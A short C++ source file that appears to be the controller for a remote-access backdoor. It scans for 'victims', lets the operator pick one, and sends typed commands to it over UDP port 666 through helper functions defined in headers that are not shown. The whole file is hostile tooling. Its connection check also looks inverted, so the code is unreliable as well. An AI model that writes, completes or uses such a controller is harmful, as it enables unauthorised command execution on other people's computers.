#include "Utils.h"
#include "Network.h"

#include<iostream>
#include <thread>
#include <string>

#pragma comment(lib, "ws2_32.lib")

int main()
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	uint32_t* addresses = new uint32_t[100]{ 0 };
	sockaddr_in victimInfo;
	SOCKET s;
	std::string command;

	victimInfo.sin_family = AF_INET;
	victimInfo.sin_port = htons(666);

	while (1)
	{
		s = socket(AF_INET, SOCK_DGRAM, 0);
		searchVictims(addresses);
		printVictims(addresses);
		victimInfo.sin_addr.s_addr = chooseVictim(addresses);
		if(!connect(s, (sockaddr*)&victimInfo, sizeof victimInfo))
			continue;
		while(1)
		{
			std::cout << "\n$>";
			std::getline(std::cin, command);
			if (command._Equal("return"))
				break;
			telNet(s, command);
		}
		closesocket(s);
	}

	
}

